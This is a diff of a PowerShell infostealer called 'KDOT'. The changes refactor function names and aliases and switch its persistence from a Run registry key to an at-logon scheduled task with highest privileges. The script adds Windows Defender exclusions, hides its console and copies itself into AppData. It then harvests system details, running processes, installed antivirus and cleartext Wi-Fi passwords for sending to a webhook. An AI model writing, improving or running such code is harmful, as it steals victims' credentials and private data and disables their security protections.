@@ -1,8 +1,9 @@
 function CHECK_IF_ADMIN {
-    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
+    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+    return $test
 }
 
-function EXFILTRATE-DATA {
+function Invoke-Extraction {
     $webhook = "YOUR_WEBHOOK_HERE"
     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
     $ip = $ip.Content
@@ -20,13 +21,13 @@ function EXFILTRATE-DATA {
     $gpu = (Get-WmiObject Win32_VideoController).Name 
     $gpu > $env:LOCALAPPDATA\Temp\GPU.txt
     $format = " GB"
-    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
+    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
     $raminfo = "$total" + "$format"  
-    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
+    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
     $mac > $env:LOCALAPPDATA\Temp\mac.txt
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
-    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
+    netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
 	
 	
 	# List of Installed AVs
@@ -36,21 +37,21 @@ function EXFILTRATE-DATA {
     $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
     $AntivirusProduct.displayName 
     }
-    $avlist = get-installed-av -autosize | ft | out-string
+    $avlist = get-installed-av -autosize | Format-Table | out-string
     
-    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
+    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
     $wifi = $wifipasslist | out-string 
     $wifi > $env:temp\WIFIPasswords.txt
     
     Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
     
-    Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
+    Get-WmiObject win32_service |Where-Object State -match "running" | Select-Object Name, DisplayName, PathName, User | Sort-Object Name | Format-Table -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
     
-    Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
+    Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | Format-Table -wrap -autosize > $env:temp\running-applications.txt
     
     Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
     
-    Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
+    Get-NetAdapter | Format-Table Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
 
     
     $ProductKey
@@ -177,24 +178,23 @@ function EXFILTRATE-DATA {
     Remove-Item "$extracted\main.exe"
 }
 
-function TASKS {
-    $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT"
-    if ($test_KDOT -eq $false) {
-        try {
-            Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
-            Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
-        } catch {
-            Write-Host "Failed to add exclusions"
-        }
-        New-Item -ItemType Directory -Path "$env:APPDATA\KDOT"
-        $origin = $PSCommandPath
-        Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1"
-    }
+function Invoke-TASKS {
+    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
+    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
+    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT"
+    $origin = $PSCommandPath
+    Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1"
     $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1"
-    $command = "powershell.exe -NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File `"$scriptPath`""
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    New-ItemProperty -Path $regPath -Name "KDOT" -Value $command -PropertyType String -Force | Out-Null
-    EXFILTRATE-DATA
+    $batch_code = "powershell -ExecutionPolicy Bypass -File $scriptPath"
+    $batch_path = "$env:APPDATA\KDOT\KDOT.bat"
+    Set-Content -Path $batch_path -Value $batch_code -Encoding ASCII    
+    $task_name = "KDOT"
+    $task_action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $batch_path"
+    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
+    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
+
+    Invoke-Extraction
 }
 
 function diskdata {
@@ -205,7 +205,7 @@ function diskdata {
         $totalspace = [math]::round($disk.size / 1GB, 2)
         $freespace = [math]::round($disk.freespace / 1GB, 2)
         $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
-        $disk | Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} | FT 
+        $disk | Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} | Format-Table 
     }
 }
 
@@ -255,8 +255,9 @@ function Hide-Console
 
 if (CHECK_IF_ADMIN -eq $true) {
     Hide-Console
-    TASKS
+    Invoke-TASKS
 } else {
     Write-Host ("Please run as admin!") -ForegroundColor Red
+    Start-Sleep -s 5
     Request-Admin
 }
